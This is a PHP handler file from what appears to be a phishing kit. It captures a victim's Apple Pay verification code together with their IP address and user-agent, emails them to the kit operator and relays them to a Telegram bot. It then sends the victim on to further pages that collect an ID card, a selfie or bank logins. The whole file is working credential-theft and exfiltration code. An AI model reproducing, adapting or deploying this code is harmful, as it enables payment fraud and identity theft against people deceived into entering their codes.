<?php 
session_start();
include('../settings.php');
include ('../isk/all.php');


if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{


	$_SESSION['applepay_code'] = $_POST['applepay'];


if(!empty($_SESSION['applepay_code']) || strlen($_SESSION['applepay_code']) < 6){
	$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=97=BD=E3=80=8D_-_APPLE_PAY_=5B2=2F2=5D_-_?= ".$_SESSION['ip'];
	$message ="

🍎 CODE : ".$_SESSION['applepay_code']."


🔑 Adresse IP : ".$_SESSION['ip']."
🕹️ User-agent : ".$_SESSION['useragent']."

                      ";
     $headers = "From: =?utf-8?Q?=F0=9F=A5=B7?= ".$spammername." =?utf-8?Q?=F0=9F=A5=B7?= <email@crusixv4.me>";
     mail($boiterez,$subject,$message,$headers);
     if($telegram == "on")
                      {
      
  $data = [
                                      'text' => '
                                      
🍎 CODE : '.$_SESSION['applepay_code'].'


🔑 Adresse IP : '.$_SESSION['ip'].'
🕹️ User-agent : '.$_SESSION['useragent'].'

                                      ',
                                      'chat_id' => $chat_id
                                ];

                            file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );

                      }
     if($cni == "on")
	{
		header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotocni']);
	}
	else{
	if($selfie == "on")
	{
	header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotoselfie']);
	}
	else
	{
	if($log_bank == "on")
	{
	header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotologbank']);
	}
	else{
	header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotofinished']);

	}

	}

}

}
else{
	header('Location: applepay.php?'.$_SESSION['userid'].$_SESSION['gotoapplepay'].$_SESSION['errorapay']);
}



}
else{
	die('HTTP/1.0 404 Not Found');
}

?>